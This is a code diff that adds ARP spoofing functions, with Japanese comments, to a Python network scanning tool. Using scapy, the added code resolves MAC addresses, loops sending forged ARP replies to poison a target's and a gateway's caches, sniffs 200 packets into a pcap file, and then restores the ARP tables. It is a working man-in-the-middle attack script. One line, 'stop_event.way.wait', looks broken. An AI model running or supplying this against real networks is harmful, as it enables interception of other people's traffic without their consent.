@@ -12,13 +12,13 @@ import codecs
 import time
 import threading
 from queue import Queue
-import os
+import os,sys
 from tqdm import tqdm
 
 
 #自身のIPアドレスを取得する
 def get_own_ip():
-    ip = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
+    ip = netifaces.ifaddresses('en0')[netifaces.AF_INET][0]['addr']
     return ip
 
 
@@ -192,6 +192,80 @@ def port_scan(ip,port=0,port_end=65535):
             print('{} is close', port)
             print(os.strerror(errno))
     return open_port
+
+
+#arp_spoofingのための関数を以下に定義していく
+
+#macアドレスの取得
+#なりすましたい対象のipアドレスからMACアドレスを取得する
+def get_mac(ip_address):
+    responses,unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address),timeout=2,retry=10)
+    for s,r in responses:
+        return r[Ether].src
+    return None
+
+#偽ARPテーブル作成
+def poison_target(gateway_ip,gateway_mac,target_ip,target_mac,stop_event):
+    poison_target = ARP()
+    poison_target.op=2
+    poison_target.psrc=gateway_ip
+    poison_target.pdst=target_ip
+    poison_target.hwdst=target_mac
+    
+    poison_gateway=ARP()
+    poison_gateway.op=2
+    poison_gateway.psrc=target_ip
+    poison_gateway.pdst=gateway_ip
+    poison_gateway.hwdst=gateway_mac
+    
+    #arpぽいぞニング開始
+    while True:
+        send(poison_target)
+        send(poison_gateway)
+        #終了イベント
+        if stop_event.way.wait(2):
+            break
+    return
+
+#arpテーブルリセット
+def reset_target(gateway_ip,gateway_mac,target_ip,target_mac):
+    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=gateway_mac),count=5)
+    send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=target_mac),count=5)
+    
+def arp_poisoning(target_ip,gateway_ip):
+    host_ip=get_own_ip()
+    interface='en0'
+    
+    packet_count=200
+    conf.iface=interface
+    conf.verb=0
+    
+    gateway_mac=get_mac(gateway_ip)
+    
+    #gateway_macなかったら失敗
+    if not gateway_mac:
+        sys.exit(1)
+        
+    target_mac=get_mac(target_ip)
+    
+    #target_macがなかったら失敗
+    if not target_mac:
+        sys.exit(1)
+        
+    stop_event = threading.Event()
+    poison_thread = threading.Thread(target=poison_target,args=[gateway_ip,gateway_mac,target_ip,target_mac,stop_event])
+    poison_thread.start()
+    
+    packets=sniff(count=packet_count,iface=interface)
+    
+    wrpcap('file/arper.pcap',packets)
+    
+    stop_event.set()
+    poison_thread.join()
+    
+    reset_target(gateway_ip,gateway_mac,target_ip,target_mac)
+    
+    
 
 
     
